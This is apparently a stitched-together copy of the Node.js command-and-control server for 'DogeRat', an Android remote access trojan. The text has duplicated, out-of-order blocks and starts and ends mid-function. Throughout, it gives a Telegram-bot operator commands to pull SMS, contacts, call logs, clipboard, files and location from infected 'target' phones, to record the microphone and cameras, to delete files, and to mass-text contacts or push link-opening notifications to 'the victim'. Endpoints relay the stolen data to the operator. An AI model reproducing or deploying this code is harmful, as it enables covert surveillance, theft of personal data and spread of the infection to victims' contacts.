            // معالجة رسائل الأوامر
            if (id && chatId.toString() === id.toString()) {
                handleCommandMessage(message, chatId);
            } else if (message.text === '/start' || message.text?.startsWith('/')) {
                // السماح فقط بأمر /start للمستخدمين غير المصرح لهم
                if (message.text === '/start') {
                    appBot.sendMessage(chatId,
                        '°• الوصول مرفوض\n\n' +
                        '• هذا البوت خاص. اتصل بالمسؤول للوصول.',
                        { parse_mode: "HTML" }
                    ).catch(err => console.error('خطأ:', err.message));
                }
            }
        } catch (error) {
            console.error('خطأ في معالجة الرسالة:', error.message);
        }
    });

    appBot.on("callback_query", (callbackQuery) => {
        try {
            handleCallbackQuery(callbackQuery);
        } catch (error) {
            console.error('خطأ في استعلام رد الاتصال:', error.message);
        }
    });

    appBot.on('error', (error) => {
        console.error('خطأ في البوت:', error.message);
    });

    appBot.on('polling_error', (error) => {
        console.error('خطأ في الاستطلاع:', error.message);
    });
}

function handleReplyMessage(message, chatId) {
    if (!id || chatId.toString() !== id.toString()) return;
    
    const replyText = message.reply_to_message?.text || '';
    
    if (replyText.includes('°• يرجى الرد بالرقم الذي تريد إرسال الرسالة إليه')) {
        currentNumber = message.text;
        appBot.sendMessage(id,
            '°• رائع، الآن أدخل الرسالة التي تريد إرسالها إلى هذا الرقم\n\n' +
            '• كن حذراً، لن يتم إرسال الرسالة إذا كان عدد الأحرف في رسالتك أكثر من المسموح به',
            { reply_markup: { force_reply: true } }
        ).catch(err => console.error('خطأ:', err.message));
    }
    
    if (replyText.includes('°• رائع، الآن أدخل الرسالة التي تريد إرسالها إلى هذا الرقم')) {
        sendToDevice(currentUuid, `send_message:${currentNumber}/${message.text}`);
        currentNumber = '';
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• أدخل الرسالة التي تريد إرسالها إلى جميع جهات الاتصال')) {
        sendToDevice(currentUuid, `send_message_to_all:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• أدخل مسار الملف الذي تريد تحميله')) {
        sendToDevice(currentUuid, `file:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• أدخل مسار الملف الذي تريد حذفه')) {
        sendToDevice(currentUuid, `delete_file:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• أدخل المدة التي تريد تسجيل الميكروفون فيها')) {
        const duration = parseInt(message.text);
        if (!isNaN(duration) && duration > 0) {
            sendToDevice(currentUuid, `microphone:${duration}`);
        } else {
            appBot.sendMessage(id, '°• مدة غير صالحة. يرجى إدخال رقم صحيح بالثواني.').catch(() => {});
        }
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• أدخل المدة التي تريد تسجيل الكاميرا الرئيسية فيها')) {
        sendToDevice(currentUuid, `rec_camera_main:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• أدخل المدة التي تريد تسجيل كاميرا السيلفي فيها')) {
        sendToDevice(currentUuid, `rec_camera_selfie:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• أدخل الرسالة التي تريد أن تظهر على الجهاز المستهدف')) {
        currentTitle = message.text;
        appBot.sendMessage(id,
            '°• رائع، الآن أدخل الرابط الذي تريد فتحه بواسطة الإشعار\n\n' +
            '• عندما ينقر الضحية على الإشعار، سيتم فتح الرابط الذي تدخله',
            { reply_markup: { force_reply: true } }
        ).catch(err => console.error('خطأ:', err.message));
    }
    
    if (replyText.includes('°• رائع، الآن أدخل الرابط الذي تريد فتحه بواسطة الإشعار')) {
        sendToDevice(currentUuid, `show_notification:${currentTitle}/${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• أدخل رابط الصوت الذي تريد تشغيله')) {
        sendToDevice(currentUuid, `play_audio:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
}

function handleCommandMessage(message, chatId) {
    if (message.text === '/start') {
        appBot.sendMessage(id,
            '°• مرحباً بك في لوحة تحكم Rat\n\n' +
            '• إذا كان التطبيق مثبتاً على الجهاز المستهدف، انتظر الاتصال\n\n' +
            '• عندما تتلقى رسالة الاتصال، فهذا يعني أن الجهاز المستهدف متصل وجاهز لتلقي الأوامر\n\n' +
            '• انقر على زر الأوامر وحدد الجهاز المطلوب ثم حدد الأمر المطلوب من بين الأوامر\n\n' +
            '• إذا علقت في مكان ما في البوت، أرسل أمر /start',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الأجهزة المتصلة"], ["تنفيذ أمر"]],
                    'resize_keyboard': true
                }
            }
        ).catch(err => console.error('خطأ:', err.message));
    }
    
    if (message.text === 'الأجهزة المتصلة') {
        if (appClients.size === 0) {
            appBot.sendMessage(id,
                '°• لا توجد أجهزة متصلة متاحة\n\n' +
                '• تأكد من تثبيت التطبيق على الجهاز المستهدف'
            ).catch(err => console.error('خطأ:', err.message));
        } else {
            let text = '°• قائمة الأجهزة المتصلة :\n\n';
            appClients.forEach(function (value, key, map) {
                text += `• موديل الجهاز : <b>${value.model}</b>\n` +
                    `• البطارية : <b>${value.battery}</b>\n` +
                    `• إصدار أندرويد : <b>${value.version}</b>\n` +
                    `• سطوع الشاشة : <b>${value.brightness}</b>\n` +
                    `• المزود : <b>${value.provider}</b>\n\n`;
            });
            appBot.sendMessage(id, text, { parse_mode: "HTML" }).catch(err => console.error('خطأ:', err.message));
        }
    }
    
    if (message.text === 'تنفيذ أمر') {
        if (appClients.size === 0) {
            appBot.sendMessage(id,
                '°• لا توجد أجهزة متصلة متاحة\n\n' +
                '• تأكد من تثبيت التطبيق على الجهاز المستهدف'
            ).catch(err => console.error('خطأ:', err.message));
        } else {
            const deviceListKeyboard = [];
            appClients.forEach(function (value, key, map) {
                deviceListKeyboard.push([{
                    text: value.model,
                    callback_data: 'device:' + key
                }]);
            });
            appBot.sendMessage(id, '°• حدد الجهاز لتنفيذ الأمر', {
                "reply_markup": {
                    "inline_keyboard": deviceListKeyboard,
                },
            }).catch(err => console.error('خطأ:', err.message));
        }
    }
}

function handleCallbackQuery(callbackQuery) {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const commend = data.split(':')[0];
    const uuid = data.split(':')[1];

    if (!id) return;

    const commandHandlers = {
        'device': () => {
            const deviceInfo = appClients.get(uuid);
            if (!deviceInfo) {
                appBot.sendMessage(id, '°• الجهاز غير موجود أو منفصل').catch(() => {});
                return;
            }
            appBot.editMessageText(`°• حدد أمراً للجهاز : <b>${deviceInfo.model}</b>`, {
                chat_id: id,
                message_id: msg.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: 'التطبيقات', callback_data: `apps:${uuid}` },
                            { text: 'معلومات الجهاز', callback_data: `device_info:${uuid}` }
                        ],
                        [
                            { text: 'جلب ملف', callback_data: `file:${uuid}` },
                            { text: 'حذف ملف', callback_data: `delete_file:${uuid}` }
                        ],
                        [
                            { text: 'الحافظة', callback_data: `clipboard:${uuid}` },
                            { text: 'الميكروفون', callback_data: `microphone:${uuid}` },
                        ],
                        [
                            { text: 'الكاميرا الرئيسية', callback_data: `camera_main:${uuid}` },
                            { text: 'كاميرا السيلفي', callback_data: `camera_selfie:${uuid}` }
                        ],
                        [
                            { text: 'الموقع', callback_data: `location:${uuid}` },
                            { text: 'رسالة توست', callback_data: `toast:${uuid}` }
                        ],
                        [
                            { text: 'المكالمات', callback_data: `calls:${uuid}` },
                            { text: 'جهات الاتصال', callback_data: `contacts:${uuid}` }
                        ],
                        [
                            { text: 'اهتزاز', callback_data: `vibrate:${uuid}` },
                            { text: 'إظهار إشعار', callback_data: `show_notification:${uuid}` }
                        ],
                        [
                            { text: 'الرسائل', callback_data: `messages:${uuid}` },
                            { text: 'إرسال رسالة', callback_data: `send_message:${uuid}` }
                        ],
                        [
                            { text: 'تشغيل صوت', callback_data: `play_audio:${uuid}` },
                            { text: 'إيقاف الصوت', callback_data: `stop_audio:${uuid}` },
                        ],
                        [
                            {
                                text: 'إرسال رسالة لجميع جهات الاتصال',
                                callback_data: `send_message_to_all:${uuid}`
                            }
                        ],
                    ]
                },
                parse_mode: "HTML"
            }).catch(err => console.error('خطأ:', err.message));
        },
        'calls': () => {
            sendToDevice(uuid, 'calls');
            deleteAndSendProcessing(msg.message_id);
        },
        'contacts': () => {
            sendToDevice(uuid, 'contacts');
            deleteAndSendProcessing(msg.message_id);
        },
        'messages': () => {
            sendToDevice(uuid, 'messages');
            deleteAndSendProcessing(msg.message_id);
        },
        'apps': () => {
            sendToDevice(uuid, 'apps');
            deleteAndSendProcessing(msg.message_id);
        },
        'device_info': () => {
            sendToDevice(uuid, 'device_info');
            deleteAndSendProcessing(msg.message_id);
        },
        'clipboard': () => {
            sendToDevice(uuid, 'clipboard');
            deleteAndSendProcessing(msg.message_id);
        },
        'camera_main': () => {
            sendToDevice(uuid, 'camera_main');
            deleteAndSendProcessing(msg.message_id);
        },
        'camera_selfie': () => {
            sendToDevice(uuid, 'camera_selfie');
            deleteAndSendProcessing(msg.message_id);
        },
        'location': () => {
            sendToDevice(uuid, 'location');
            deleteAndSendProcessing(msg.message_id);
        },
        'vibrate': () => {
            sendToDevice(uuid, 'vibrate');
            deleteAndSendProcessing(msg.message_id);
        },
        'stop_audio': () => {
            sendToDevice(uuid, 'stop_audio');
            deleteAndSendProcessing(msg.message_id);
        },
        'send_message': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id, '°• يرجى الرد بالرقم الذي تريد إرسال الرسالة إليه\n\n' +
                '• إذا كنت تريد إرسال رسالة نصية قصيرة إلى أرقام محلية، يمكنك إدخال الرقم مع صفر في البداية، وإلا أدخل الرقم مع رمز الدولة',
                { reply_markup: { force_reply: true } }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'send_message_to_all': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل الرسالة التي تريد إرسالها إلى جميع جهات الاتصال\n\n' +
                '• كن حذراً، لن يتم إرسال الرسالة إذا كان عدد الأحرف في رسالتك أكثر من المسموح به',
                { reply_markup: { force_reply: true } }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'file': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل مسار الملف الذي تريد تحميله\n\n' +
                '• لا تحتاج إلى إدخال مسار الملف الكامل، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لاستلام ملفات المعرض.',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'delete_file': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل مسار الملف الذي تريد حذفه\n\n' +
                '• لا تحتاج إلى إدخال مسار الملف الكامل، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لحذف ملفات المعرض.',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'microphone': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل المدة التي تريد تسجيل الميكروفون فيها\n\n' +
                '• لاحظ أنه يجب عليك إدخال الوقت رقمياً بوحدات الثواني',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'toast': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل الرسالة التي تريد أن تظهر على الجهاز المستهدف\n\n' +
                '• رسالة التوست هي رسالة قصيرة تظهر على شاشة الجهاز لبضع ثوان',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'show_notification': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل الرسالة التي تريد أن تظهر كإشعار\n\n' +
                '• ستظهر رسالتك في شريط حالة الجهاز المستهدف مثل الإشعارات العادية',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'play_audio': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل رابط الصوت الذي تريد تشغيله\n\n' +
                '• لاحظ أنه يجب عليك إدخال الرابط المباشر للصوت المطلوب، وإلا فلن يتم تشغيل الصوت',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        }
    };

    if (commandHandlers[commend]) {
        commandHandlers[commend]();
    }
}

function sendToDevice(uuid, command) {
    appSocket.clients.forEach(function each(ws) {
        if (ws.uuid === uuid) {
            ws.send(command);
        }
    });
}

function deleteAndSendProcessing(messageId) {
    if (appBot && id) {
        appBot.deleteMessage(id, messageId).catch(() => {});
        sendProcessingMessage();
    }
}

function sendProcessingMessage() {
    if (appBot && id) {
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• ستتلقى رداً في اللحظات القليلة القادمة',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الأجهزة المتصلة"], ["تنفيذ أمر"]],
                    'resize_keyboard': true
                }
            }
        ).catch(err => console.error('خطأ:', err.message));
    }
}

// نبضة بقاء الاتصال
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping');
    });
    
    // اختياري: إبقاء الخادم مستيقظاً عن طريق إرسال طلب لخدمة خارجية
    if (address) {
        axios.get(address).catch(() => {
            // تجاهل الأخطاء من الطلب
        });
    }
}, 5000);

// إغلاق آمن
process.on('SIGTERM', () => {
    console.log('تم استلام إشارة SIGTERM: إغلاق خادم HTTP');
    appServer.close(() => {
        console.log('تم إغلاق خادم HTTP');
        process.exit(0);
    });
});

process.on('SIGINT', () => {
    console.log('تم استلام إشارة SIGINT: إغلاق خادم HTTP');
    appServer.close(() => {
        console.log('تم إغلاق خادم HTTP');
        process.exit(0);
    });
});

// بدء الخادم
appServer.listen(PORT, () => {
    console.log(`خادم DogeRat v1.0.0 يعمل على المنفذ ${PORT}`);
    console.log(`ستظهر الأجهزة المتصلة هنا`);
});
        },
        'clipboard': () => {
            sendToDevice(uuid, 'clipboard');
            deleteAndSendProcessing(msg.message_id);
        },
        'camera_main': () => {
            sendToDevice(uuid, 'camera_main');
            deleteAndSendProcessing(msg.message_id);
        },
        'camera_selfie': () => {
            sendToDevice(uuid, 'camera_selfie');
            deleteAndSendProcessing(msg.message_id);
        },
        'location': () => {
            sendToDevice(uuid, 'location');
            deleteAndSendProcessing(msg.message_id);
        },
        'vibrate': () => {
            sendToDevice(uuid, 'vibrate');
            deleteAndSendProcessing(msg.message_id);
        },
        'stop_audio': () => {
            sendToDevice(uuid, 'stop_audio');
            deleteAndSendProcessing(msg.message_id);
        },
        'send_message': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id, '°• يرجى الرد بالرقم الذي تريد إرسال الرسالة إليه\n\n' +
                '• إذا كنت تريد إرسال رسالة نصية قصيرة إلى أرقام محلية، يمكنك إدخال الرقم مع صفر في البداية، وإلا أدخل الرقم مع رمز الدولة',
                { reply_markup: { force_reply: true } }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'send_message_to_all': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل الرسالة التي تريد إرسالها إلى جميع جهات الاتصال\n\n' +
                '• كن حذراً، لن يتم إرسال الرسالة إذا كان عدد الأحرف في رسالتك أكثر من المسموح به',
                { reply_markup: { force_reply: true } }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'file': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل مسار الملف الذي تريد تحميله\n\n' +
                '• لا تحتاج إلى إدخال مسار الملف الكامل، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لاستلام ملفات المعرض.',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'delete_file': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل مسار الملف الذي تريد حذفه\n\n' +
                '• لا تحتاج إلى إدخال مسار الملف الكامل، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لحذف ملفات المعرض.',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'microphone': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل المدة التي تريد تسجيل الميكروفون فيها\n\n' +
                '• لاحظ أنه يجب عليك إدخال الوقت رقمياً بوحدات الثواني',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'toast': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل الرسالة التي تريد أن تظهر على الجهاز المستهدف\n\n' +
                '• رسالة التوست هي رسالة قصيرة تظهر على شاشة الجهاز لبضع ثوان',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'show_notification': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل الرسالة التي تريد أن تظهر كإشعار\n\n' +
                '• ستظهر رسالتك في شريط حالة الجهاز المستهدف مثل الإشعارات العادية',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'play_audio': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل رابط الصوت الذي تريد تشغيله\n\n' +
                '• لاحظ أنه يجب عليك إدخال الرابط المباشر للصوت المطلوب، وإلا فلن يتم تشغيل الصوت',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        }
    };

    if (commandHandlers[commend]) {
        commandHandlers[commend]();
    }
}

function sendToDevice(uuid, command) {
    appSocket.clients.forEach(function each(ws) {
        if (ws.uuid === uuid) {
            ws.send(command);
        }
    });
}

function deleteAndSendProcessing(messageId) {
    if (appBot && id) {
        appBot.deleteMessage(id, messageId).catch(() => {});
        sendProcessingMessage();
    }
}

function sendProcessingMessage() {
    if (appBot && id) {
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• ستتلقى رداً في اللحظات القليلة القادمة',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الأجهزة المتصلة"], ["تنفيذ أمر"]],
                    'resize_keyboard': true
                }
            }
        ).catch(err => console.error('خطأ:', err.message));
    }
}

// نبضة بقاء الاتصال
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping');
    });
    
    // اختياري: إبقاء الخادم مستيقظاً عن طريق إرسال طلب لخدمة خارجية
    if (address) {
        axios.get(address).catch(() => {
            // تجاهل الأخطاء من الطلب
        });
    }
}, 5000);

// إغلاق آمن
process.on('SIGTERM', () => {
    console.log('تم استلام إشارة SIGTERM: إغلاق خادم HTTP');
    appServer.close(() => {
        console.log('تم إغلاق خادم HTTP');
        process.exit(0);
    });
});

process.on('SIGINT', () => {
    console.log('تم استلام إشارة SIGINT: إغلاق خادم HTTP');
    appServer.close(() => {
        console.log('تم إغلاق خادم HTTP');
        process.exit(0);
    });
});

// بدء الخادم
appServer.listen(PORT, () => {
    console.log(`خادم DogeRat v1.0.0 يعمل على المنفذ ${PORT}`);
    console.log(`ستظهر الأجهزة المتصلة هنا`);
});
const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');
const fs = require('fs');

// تحميل متغيرات البيئة
require('dotenv').config();

// الإعدادات - استخدام متغيرات البيئة أو القيم الافتراضية
const token = process.env.TELEGRAM_BOT_TOKEN || '';
const id = process.env.TELEGRAM_CHAT_ID || '';
const address = process.env.PING_ADDRESS || 'https://www.google.com';
const PORT = process.env.PORT || 8999;

// التحقق من الإعدادات
if (!token || token === 'telegram_bot_token_here') {
    console.error('خطأ: لم يتم تكوين TELEGRAM_BOT_TOKEN!');
    console.error('يرجى تعيين متغير البيئة TELEGRAM_BOT_TOKEN');
}
if (!id || id === 'telegram_chatid-here') {
    console.warn('تحذير: لم يتم تكوين TELEGRAM_CHAT_ID!');
    console.warn('لن يقوم البوت بإرسال رسائل لأي شخص حتى يتم تعيين معرف الدردشة');
}

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ 
    server: appServer,
    perMessageDeflate: false,
    clientTracking: true
});

let appBot = null;
try {
    appBot = new telegramBot(token, { polling: true });
    console.log('تم تشغيل بوت التيليجرام بنجاح');
} catch (error) {
    console.error('فشل في تشغيل بوت التيليجرام:', error.message);
}

const appClients = new Map();

const upload = multer({ 
    storage: multer.memoryStorage(),
    limits: { fileSize: 50 * 1024 * 1024 } // حد 50 ميجابايت
});
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

// نقطة فحص الحالة
app.get('/', function (req, res) {
    res.send('<h1 align="center">خادم DogeRat v1.0.0</h1><p>الحالة: متصل</p>');
});

// نقطة الحالة
app.get('/status', function (req, res) {
    res.json({
        status: 'online',
        connectedDevices: appClients.size,
        uptime: process.uptime()
    });
});

// نقطة رفع الملفات
app.post("/uploadFile", upload.single('file'), (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).send('لم يتم رفع أي ملف');
        }
        
        const name = req.file.originalname || 'ملف_غير_معروف';
        const model = req.headers.model || 'جهاز غير معروف';
        
        if (appBot && id) {
            appBot.sendDocument(id, req.file.buffer, {
                caption: `°• رسالة من جهاز <b>${model}</b>`,
                parse_mode: "HTML"
            }, {
                filename: name,
                contentType: 'application/octet-stream',
            }).catch(err => console.error('خطأ في إرسال المستند:', err.message));
        }
        res.send('OK');
    } catch (error) {
        console.error('خطأ في رفع الملف:', error.message);
        res.status(500).send('خطأ في رفع الملف');
    }
});

// نقطة رفع النصوص
app.post("/uploadText", (req, res) => {
    try {
        const model = req.headers.model || 'جهاز غير معروف';
        const text = req.body['text'] || '';
        
        if (appBot && id) {
            appBot.sendMessage(id, `°• رسالة من جهاز <b>${model}</b>\n\n` + text, { 
                parse_mode: "HTML" 
            }).catch(err => console.error('خطأ في إرسال الرسالة:', err.message));
        }
        res.send('OK');
    } catch (error) {
        console.error('خطأ في رفع النص:', error.message);
        res.status(500).send('خطأ في رفع النص');
    }
});

// نقطة رفع الموقع
app.post("/uploadLocation", (req, res) => {
    try {
        const lat = req.body['lat'];
        const lon = req.body['lon'];
        const model = req.headers.model || 'جهاز غير معروف';
        
        if (appBot && id && lat && lon) {
            appBot.sendLocation(id, lat, lon).catch(err => console.error('خطأ في إرسال الموقع:', err.message));
            appBot.sendMessage(id, `°• موقع من جهاز <b>${model}</b>`, { 
                parse_mode: "HTML" 
            }).catch(err => console.error('خطأ في إرسال رسالة الموقع:', err.message));
        }
        res.send('OK');
    } catch (error) {
        console.error('خطأ في رفع الموقع:', error.message);
        res.status(500).send('خطأ في رفع الموقع');
    }
});

// معالجة اتصال WebSocket
appSocket.on('connection', (ws, req) => {
    try {
        const uuid = uuid4.v4();
        const model = req.headers.model || 'جهاز غير معروف';
        const battery = req.headers.battery || '0';
        const version = req.headers.version || 'غير معروف';
        const brightness = req.headers.brightness || '0';
        const provider = req.headers.provider || 'غير معروف';

        ws.uuid = uuid;
        ws.isAlive = true;
        
        appClients.set(uuid, {
            model: model,
            battery: battery,
            version: version,
            brightness: brightness,
            provider: provider,
            connectedAt: new Date().toISOString()
        });
        
        console.log(`جهاز متصل: ${model} (${uuid})`);
        
        if (appBot && id) {
            appBot.sendMessage(id,
                `°• تم اتصال جهاز جديد\n\n` +
                `• موديل الجهاز : <b>${model}</b>\n` +
                `• البطارية : <b>${battery}</b>\n` +
                `• إصدار أندرويد : <b>${version}</b>\n` +
                `• سطوع الشاشة : <b>${brightness}</b>\n` +
                `• المزود : <b>${provider}</b>`,
                { parse_mode: "HTML" }
            ).catch(err => console.error('خطأ في إرسال رسالة الاتصال:', err.message));
        }

        ws.on('pong', () => {
            ws.isAlive = true;
        });

        ws.on('close', function () {
            console.log(`فصل الجهاز: ${model} (${uuid})`);
            
            if (appBot && id) {
                appBot.sendMessage(id,
                    `°• تم فصل الجهاز\n\n` +
                    `• موديل الجهاز : <b>${model}</b>\n` +
                    `• البطارية : <b>${battery}</b>\n` +
                    `• إصدار أندرويد : <b>${version}</b>\n` +
                    `• سطوع الشاشة : <b>${brightness}</b>\n` +
                    `• المزود : <b>${provider}</b>`,
                    { parse_mode: "HTML" }
                ).catch(err => console.error('خطأ في إرسال رسالة الفصل:', err.message));
            }
            appClients.delete(ws.uuid);
        });

        ws.on('error', function (error) {
            console.error(`خطأ WebSocket للجهاز ${model}:`, error.message);
        });
        
    } catch (error) {
        console.error('خطأ في معالجة الاتصال:', error.message);
    }
});

// نبضات القلب للكشف عن العملاء المنفصلين
const heartbeatInterval = setInterval(() => {
    appSocket.clients.forEach((ws) => {
        if (ws.isAlive === false) {
            console.log(`إنهاء الاتصال الميت: ${ws.uuid}`);
            return ws.terminate();
        }
        ws.isAlive = false;
        ws.ping();
    });
}, 30000);

appSocket.on('close', () => {
    clearInterval(heartbeatInterval);
});

// معالجة رسائل بوت التيليجرام
if (appBot) {
    appBot.on('message', (message) => {
        try {
            const chatId = message.chat.id;
            
            // معالجة رسائل الرد
            if (message.reply_to_message) {
                handleReplyMessage(message, chatId);
            }
            
            // معالجة رسائل الأوامر
            if (id && chatId.toString() === id.toString()) {
                handleCommandMessage(message, chatId);
            } else if (message.text === '/start' || message.text?.startsWith('/')) {
                // السماح فقط بأمر /start للمستخدمين غير المصرح لهم
                if (message.text === '/start') {
                    appBot.sendMessage(chatId,
                        '°• الوصول مرفوض\n\n' +
                        '• هذا البوت خاص. اتصل بالمسؤول للوصول.',
                        { parse_mode: "HTML" }
                    ).catch(err => console.error('خطأ:', err.message));
                }
            }
        } catch (error) {
            console.error('خطأ في معالجة الرسالة:', error.message);
        }
    });

    appBot.on("callback_query", (callbackQuery) => {
        try {
            handleCallbackQuery(callbackQuery);
        } catch (error) {
            console.error('خطأ في استعلام رد الاتصال:', error.message);
        }
    });

    appBot.on('error', (error) => {
        console.error('خطأ في البوت:', error.message);
    });

    appBot.on('polling_error', (error) => {
        console.error('خطأ في الاستطلاع:', error.message);
    });
}

function handleReplyMessage(message, chatId) {
    if (!id || chatId.toString() !== id.toString()) return;
    
    const replyText = message.reply_to_message?.text || '';
    
    if (replyText.includes('°• يرجى الرد بالرقم الذي تريد إرسال الرسالة إليه')) {
        currentNumber = message.text;
        appBot.sendMessage(id,
            '°• رائع، الآن أدخل الرسالة التي تريد إرسالها إلى هذا الرقم\n\n' +
            '• كن حذراً، لن يتم إرسال الرسالة إذا كان عدد الأحرف في رسالتك أكثر من المسموح به',
            { reply_markup: { force_reply: true } }
        ).catch(err => console.error('خطأ:', err.message));
    }
    
    if (replyText.includes('°• رائع، الآن أدخل الرسالة التي تريد إرسالها إلى هذا الرقم')) {
        sendToDevice(currentUuid, `send_message:${currentNumber}/${message.text}`);
        currentNumber = '';
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• أدخل الرسالة التي تريد إرسالها إلى جميع جهات الاتصال')) {
        sendToDevice(currentUuid, `send_message_to_all:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• أدخل مسار الملف الذي تريد تحميله')) {
        sendToDevice(currentUuid, `file:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• أدخل مسار الملف الذي تريد حذفه')) {
        sendToDevice(currentUuid, `delete_file:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• أدخل المدة التي تريد تسجيل الميكروفون فيها')) {
        const duration = parseInt(message.text);
        if (!isNaN(duration) && duration > 0) {
            sendToDevice(currentUuid, `microphone:${duration}`);
        } else {
            appBot.sendMessage(id, '°• مدة غير صالحة. يرجى إدخال رقم صحيح بالثواني.').catch(() => {});
        }
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• أدخل المدة التي تريد تسجيل الكاميرا الرئيسية فيها')) {
        sendToDevice(currentUuid, `rec_camera_main:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• أدخل المدة التي تريد تسجيل كاميرا السيلفي فيها')) {
        sendToDevice(currentUuid, `rec_camera_selfie:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• أدخل الرسالة التي تريد أن تظهر على الجهاز المستهدف')) {
        currentTitle = message.text;
        appBot.sendMessage(id,
